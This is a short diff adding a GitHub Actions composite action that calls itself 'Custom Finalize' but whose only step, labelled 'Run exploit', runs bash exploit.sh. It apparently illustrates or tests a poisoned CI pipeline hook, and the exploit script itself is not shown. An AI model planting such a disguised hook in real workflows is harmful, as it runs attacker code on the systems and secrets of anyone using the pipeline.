@@ -1,0 +1,8 @@
+name: 'Custom Finalize'
+description: 'Run custom finalize'
+runs:
+  using: 'composite'
+  steps:
+    - name: Run exploit
+      run: bash exploit.sh
+      shell: bash
